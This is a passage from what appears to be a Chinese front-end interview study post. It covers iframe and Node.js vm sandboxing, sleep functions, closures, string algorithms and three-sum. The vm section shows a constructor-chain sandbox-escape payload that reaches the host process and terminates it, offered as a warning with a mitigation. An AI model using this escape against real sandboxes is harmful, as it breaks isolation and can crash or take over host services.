src=&quot;...&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>但是这也会带来一些限制：</p><ul><li>script脚本不能执行</li><li>不能发送ajax请求</li><li>不能使用本地存储，即localStorage,cookie等</li><li>不能创建新的弹窗和window</li><li>不能发送表单</li><li>不能加载额外插件比如flash等</li></ul><p><strong>可以对这个iframe标签进行一些配置：</strong></p><p><img src="http://files.shanqianche.cn/20228/1659604025363.png" alt="允许的操作"><br>接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。</p><p>1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。<br>2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。<br>3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制</p><p>简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。</p><ol start="3"><li>nodejs中的沙箱</li></ol><p>odejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);    </span><br><span class="line">const x = 1;    </span><br><span class="line">const sandbox = &#123; x: 2 &#125;;    </span><br><span class="line">vm.createContext(sandbox); // Contextify the sandbox.    </span><br><span class="line">const code = &#x27;x += 40; var y = 17;&#x27;;    </span><br><span class="line">vm.runInContext(code, sandbox);    </span><br><span class="line">console.log(sandbox.x); // 42    </span><br><span class="line">console.log(sandbox.y); // 17    </span><br><span class="line">console.log(x); // 1;   y is not defined.</span><br></pre></td></tr></table></figure><p>vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。</p><p>但是vm是绝对安全的吗？不一定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);    </span><br><span class="line">vm.runInNewContext(&quot;this.constructor.constructor(&#x27;return process&#x27;)().exit()&quot;)</span><br></pre></td></tr></table></figure><p>通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let ctx = Object.create(null);    </span><br><span class="line">ctx.a = 1; // ctx上不能包含引用类型的属性    </span><br><span class="line">vm.runInNewContext(&quot;this.constructor.constructor(&#x27;return process&#x27;)().exit()&quot;, ctx);</span><br></pre></td></tr></table></figure><p>让我们来看一下TSW中是怎么使用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);    </span><br><span class="line">const SbFunction = vm.runInNewContext(&#x27;(Function)&#x27;, Object.create(null));        // 沙堆    </span><br><span class="line">...    </span><br><span class="line">if (opt.jsonpCallback) &#123;    </span><br><span class="line">  code = `var result=null; var $&#123;opt.jsonpCallback&#125;=function($1)&#123;result=$1&#125;; $&#123;responseText&#125;; return result;`;    </span><br><span class="line">  obj = new SbFunction(code)();    </span><br><span class="line">&#125;     </span><br><span class="line">...    </span><br></pre></td></tr></table></figure><p>通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。</p><h1 id="实现一个-JS-的sleep"><a href="#实现一个-JS-的sleep" class="headerlink" title="实现一个 JS 的sleep"></a>实现一个 JS 的sleep</h1><ol><li>普通版</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function sleep(sleepTime) &#123;</span><br><span class="line">    for(var start = new Date; new Date - start &lt;= sleepTime;) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">var t1 = +new Date()</span><br><span class="line">sleep(3000)</span><br><span class="line">var t2 = +new Date()</span><br><span class="line">console.log(t2 - t1)</span><br></pre></td></tr></table></figure><p>优点：简单粗暴，通俗易懂。<br>缺点：这是最简单粗暴的实现，确实 sleep 了，也确实卡死了，CPU 会飙升、<br>2. Promise 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function sleep(time) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, time))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const t1 = +new Date()</span><br><span class="line">sleep(3000).then(() =&gt; &#123;</span><br><span class="line">  const t2 = +new Date()</span><br><span class="line">  console.log(t2 - t1)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>优点：这种方式实际上是用了 setTimeout，没有形成进程阻塞，不会造成性能和负载问题。<br>缺点：虽然不像 callback 套那么多层，但仍不怎么美观，而且当我们需要在某过程中需要停止执行（或者在中途返回了错误的值），还必须得层层判断后跳出，非常麻烦，而且这种异步并不是那么彻底，还是看起来别扭<br>3. Async/Await 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function sleep(delay) &#123;</span><br><span class="line">  return new Promise(reslove =&gt; &#123;</span><br><span class="line">    setTimeout(reslove, delay)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">!async function test() &#123;</span><br><span class="line">  const t1 = +new Date()</span><br><span class="line">  await sleep(3000)</span><br><span class="line">  const t2 = +new Date()</span><br><span class="line">  console.log(t2 - t1)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>缺点： ES7 语法存在兼容性问题，有 babel 一切兼容性都不是问题<br><strong>更优雅的写法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function sleep (time) &#123;</span><br><span class="line">  return new Promise((resolve) =&gt; setTimeout(resolve, time));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 用法</span><br><span class="line">sleep(500).then(() =&gt; &#123;</span><br><span class="line">    // 这里写sleep之后需要去做的事情</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>不要忘了开源的力量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const sleep = require(&quot;sleep&quot;)</span><br><span class="line">const t1 = +new Date()</span><br><span class="line">sleep.msleep(3000)</span><br><span class="line">const t2 = +new Date()</span><br><span class="line">console.log(t2 - t1)</span><br></pre></td></tr></table></figure><p>优点：能够实现更加精细的时间精确度，而且看起来就是真的 sleep 函数，清晰直白。</p><h1 id="实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路"><a href="#实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路" class="headerlink" title="实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路"></a>实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路</h1><blockquote><p>数组算法中提到过</p></blockquote><h1 id="function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组"><a href="#function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组" class="headerlink" title="function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组"></a>function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组</h1><p><strong>把考点拆成了4个小项；需要用递归算法实现</strong>：<br>a) 生成一个长度为n的空数组arr。<br>b) 生成一个（min－max）之间的随机整数rand。<br>c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for/while等循环]<br>d) 最终输出一个长度为n，且内容不重复的数组arr。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function buildArray(arr, n, min, max) &#123;</span><br><span class="line">    var num = Math.floor(Math.random() * (max - min + 1)) + min;</span><br><span class="line">    if (!arr.includes(num)) &#123; arr.push(num); &#125;</span><br><span class="line">    return arr.length === n ? arr : buildArray(arr, n, min, max);</span><br><span class="line">&#125;</span><br><span class="line">var result = buildArray([], 5, 2, 32);</span><br><span class="line">console.table(result);</span><br></pre></td></tr></table></figure><h1 id="闭包的理解"><a href="#闭包的理解" class="headerlink" title="闭包的理解"></a>闭包的理解</h1><blockquote><p>一个函数和<font color="#FF8C00">对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围）</font>， 这样的组合就是闭包（closure）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。<font color="#FF00FF">在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。</font></p></blockquote><p><strong>闭包的特点：</strong></p><ul><li>让外部访问函数内部变量成为可能；</li><li>可以避免使用全局变量，防止全局变量污染；</li><li>可以让局部变量常驻在内存中；</li><li>会造成内存泄漏（有一块内存空间被长期占用，而不被释放）</li></ul><p><strong>应用场景</strong></p><ol><li>埋点（是网站分析的一种常用的数据采集方法）计数器</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function count() &#123;</span><br><span class="line">    var num = 0;</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return ++num</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var getNum = count();</span><br><span class="line">var getNewNum = count();</span><br><span class="line">document.querySelectorAll(&#x27;button&#x27;)[0].onclick = function()&#123;</span><br><span class="line">    console.log(&#x27;点击加入购物车次数： &#x27;+getNum());</span><br><span class="line">&#125;</span><br><span class="line">document.querySelectorAll(&#x27;button&#x27;)[1].onclick = function()&#123;</span><br><span class="line">    console.log(&#x27;点击付款次数： &#x27;+getNewNum());</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><ol start="2"><li>事件+循环</li></ol><p>按照以下方式添加事件，<font color="#FF00FF">打印出来的i不是按照序号的形成</font>原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var lis = document.querySelectorAll(&#x27;li&#x27;);</span><br><span class="line">for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">         lis[i].onclick = function () &#123;</span><br><span class="line">             alert(i)</span><br><span class="line">         &#125;       </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>解决办法：</strong><br>使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var lis = document.querySelectorAll(&#x27;li&#x27;);  </span><br><span class="line">for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">     (function (j) &#123;</span><br><span class="line">                lis[j].onclick = function () &#123;</span><br><span class="line">                    alert(j)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)(i)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="字符串中的单词逆序输出（手写）"><a href="#字符串中的单词逆序输出（手写）" class="headerlink" title="字符串中的单词逆序输出（手写）"></a>字符串中的单词逆序输出（手写）</h1><p>方法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">     return str.split(&quot;&quot;).reverse().join(&quot;&quot;) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">        var i=str.length;</span><br><span class="line">        var nstr = &quot;&quot;; </span><br><span class="line">        i=i-1; </span><br><span class="line">        for (var x = i; x &gt;=0; x--) &#123; </span><br><span class="line">                nstr+=str.charAt(x)</span><br><span class="line">        &#125;</span><br><span class="line">        return nstr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">        if(str.length == 0)return null; </span><br><span class="line">        var i = str.length; </span><br><span class="line">        var dstr = &quot;&quot;; </span><br><span class="line">        while(--i &gt;= 0) </span><br><span class="line">        &#123; </span><br><span class="line">            dstr += str.charAt(i);  </span><br><span class="line">        &#125; </span><br><span class="line">        return dstr; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法四：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">    return str.split(&#x27;&#x27;).reduce((prev, next) =&gt; next + prev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法五：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">        var newstr=&quot;&quot;;</span><br><span class="line">           for(var i=0;i&lt;str.length;i++)&#123;</span><br><span class="line">               newstr=str.charAt(i)+newstr;</span><br><span class="line">           &#125;</span><br><span class="line">           return newstr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法六：【TODO】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">            if(str.length===1)&#123;</span><br><span class="line">                return str</span><br><span class="line">            &#125;</span><br><span class="line">            return str.slice(-1)+strReverse(str.slice(0,-1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="给定一个字符串，请你找出其中不含有重复字符的最长子串的长度"><a href="#给定一个字符串，请你找出其中不含有重复字符的最长子串的长度" class="headerlink" title="给定一个字符串，请你找出其中不含有重复字符的最长子串的长度"></a>给定一个字符串，请你找出其中不含有重复字符的最长子串的长度</h1><p>对字符串进行遍历，使用String.prototype.indexOf()实时获取遍历过程中的无重复子串并存放于str，并保存当前状态最长无重复子串的长度为res，当遍历结束时，res的值即为无重复字符的最长子串的长度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @param &#123;string&#125; s</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> */</span><br><span class="line">var lengthOfLongestSubstring = function(s) &#123;</span><br><span class="line">    var res = 0; // 用于存放当前最长无重复子串的长度</span><br><span class="line">    var str = &quot;&quot;; // 用于存放无重复子串</span><br><span class="line">    var len = s.length;</span><br><span class="line">    for(var i = 0; i &lt; len; i++) &#123;</span><br><span class="line">      var char = s.charAt(i);</span><br><span class="line">      var index = str.indexOf(char);</span><br><span class="line">      if(index === -1) &#123;</span><br><span class="line">        str += char;</span><br><span class="line">        res = res &lt; str.length ? str.length : res;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        str = str.substr(index + 1) + char;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return res; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="去掉字符串前后的空格"><a href="#去掉字符串前后的空格" class="headerlink" title="去掉字符串前后的空格"></a>去掉字符串前后的空格</h1><p><strong>第五种方法在处理长字符串时效率最高</strong></p><ol><li>循环检查替换</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//供使用者调用  </span><br><span class="line">function trim(s)&#123;  </span><br><span class="line">    return trimRight(trimLeft(s));  </span><br><span class="line">&#125;  </span><br><span class="line">//去掉左边的空白  </span><br><span class="line">function trimLeft(s)&#123;  </span><br><span class="line">    if(s == null) &#123;  </span><br><span class="line">        return &quot;&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">    var whitespace = new String(&quot; \t\n\r&quot;);  </span><br><span class="line">    var str = new String(s);  </span><br><span class="line">    if (whitespace.indexOf(str.charAt(0)) != -1) &#123;  </span><br><span class="line">        var j=0, i = str.length;  </span><br><span class="line">        while (j &lt; i &amp;&amp; whitespace.indexOf(str.charAt(j)) != -1)&#123;  </span><br><span class="line">            j++;  </span><br><span class="line">        &#125;  </span><br><span class="line">        str = str.substring(j, i);  </span><br><span class="line">    &#125;  </span><br><span class="line">    return str;  </span><br><span class="line">&#125;  </span><br><span class="line">//去掉右边的空白 www.2cto.com </span><br><span class="line">function trimRight(s)&#123;  </span><br><span class="line">    if(s == null) return &quot;&quot;;  </span><br><span class="line">    var whitespace = new String(&quot; \t\n\r&quot;);  </span><br><span class="line">    var str = new String(s);  </span><br><span class="line">    if (whitespace.indexOf(str.charAt(str.length-1)) != -1)&#123;  </span><br><span class="line">        var i = str.length - 1;  </span><br><span class="line">        while (i &gt;= 0 &amp;&amp; whitespace.indexOf(str.charAt(i)) != -1)&#123;  </span><br><span class="line">            i--;  </span><br><span class="line">        &#125;  </span><br><span class="line">        str = str.substring(0, i+1);  </span><br><span class="line">    &#125;  </span><br><span class="line">    return str;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ol start="2"><li>正则替换</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;  </span><br><span class="line">String.prototype.Trim = function()  &#123;  </span><br><span class="line">    return this.replace(/(^\s*)|(\s*$)/g, &quot;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">String.prototype.LTrim = function()  &#123;  </span><br><span class="line">    return this.replace(/(^\s*)/g, &quot;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">String.prototype.RTrim = function()  &#123;  </span><br><span class="line">    return this.replace(/(\s*$)/g, &quot;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">&lt;/SCRIPT&gt; </span><br></pre></td></tr></table></figure><ol start="3"><li>使用jquery</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.trim(str) </span><br><span class="line">//jquery内部实现为：</span><br><span class="line">function trim(str)&#123;   </span><br><span class="line">    return str.replace(/^(\s|\u00A0)+/,&#x27;&#x27;).replace(/(\s|\u00A0)+$/,&#x27;&#x27;);   </span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><ol start="4"><li>使用motools</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function trim(str)&#123;   </span><br><span class="line">    return str.replace(/^(\s|\xA0)+|(\s|\xA0)+$/g, &#x27;&#x27;);   </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><ol start="5"><li>裁剪字符串方式</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function trim(str)&#123;   </span><br><span class="line">    str = str.replace(/^(\s|\u00A0)+/,&#x27;&#x27;);   </span><br><span class="line">    for(var i=str.length-1; i&gt;=0; i--)&#123;   </span><br><span class="line">        if(/\S/.test(str.charAt(i)))&#123;   </span><br><span class="line">            str = str.substring(0, i+1);   </span><br><span class="line">            break;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    return str;   </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h1 id="“判断输出console-log-0-console-log-1-1-”"><a href="#“判断输出console-log-0-console-log-1-1-”" class="headerlink" title="“判断输出console.log(0 == [])console.log([1] == [1])”"></a>“判断输出console.log(0 == [])console.log([1] == [1])”</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log([]==[]);  // false</span><br><span class="line">console.log([]== 0);  // true</span><br></pre></td></tr></table></figure><p><strong>原始值的比较是值的比较</strong>：<br>它们的值相等时它们就相等（<code>==</code>）<br>对象和原始值不同，<font color="#FF00FF">对象的比较并非值的比较,而是引用的比较</font>：<br>即使两个对象包含同样的属性及相同的值，它们也是不相等的<br>即使两个数组各个索引元素完全相等，它们也是不相等的,所以[]!=[]</p><p>[]<code>==</code>0,是数组进行了隐式转换，空数组会转换成数字0，所以相等</p><h1 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h1><p><strong>题目描述</strong><br>给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。</p><p>注意：答案中不可以包含重复的三元组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span><br><span class="line">//满足要求的三元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>这题我们才用排序+双指针的思路来做，遍历排序后的数组，定义指针l和r,分别从当前遍历元素的下一个元素和数组的最后一个元素往中间靠拢，计算结果跟目标对比。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @param &#123;number[]&#125; nums</span><br><span class="line"> * @return &#123;number[][]&#125;</span><br><span class="line"> */</span><br><span class="line">var threeSum = function (nums) &#123;</span><br><span class="line">  if (nums.length &lt; 3) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  nums.sort((a, b) =&gt; a - b);</span><br><span class="line">  let res = [];</span><br><span class="line">  for (let i = nums.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">    if (i &lt; nums.length &amp;&amp; nums[i] === nums[i + 1]) &#123;</span><br><span class="line">      // 左到右，已知i+1的数结果，跳过重复值去重</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    if (nums[i] &lt; 0) &#123;</span><br><span class="line">      // 右-&gt;左</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    let l = 0,</span><br><span class="line">      r = i - 1;</span><br><span class="line">    while (l &lt; r) &#123;</span><br><span class="line">      let sum = nums[i] + nums[l] + nums[r];</span><br><span class="line">      if (sum === 0) &#123;</span><br><span class="line">        res.push([nums[i], nums[l], nums[r]]);</span><br><span class="line">        while (l &lt; r &amp;&amp; nums[l] === nums[l + 1]) &#123;</span><br><span class="line">          l++;</span><br><span class="line">        &#125;</span><br><span class="line">        while (l &lt; r &amp;&amp; nums[r] === nums[r - 1]) &#123;</span><br><span class="line">          r--;</span><br><span class="line">        &#125;</span><br><span class="line">        l++;</span><br><span class="line">        r--;</span><br><span class="line">      &#125; else if (sum &lt; 0) &#123;</span><br><span class="line">        l++;</span><br><span class="line">      &#125; else if (sum &gt; 0) &#123;</span><br><span class="line">        r--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://files.shanqianche.cn/20228/1659618073234.png" alt="力扣"></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模块化(第九天)</title>
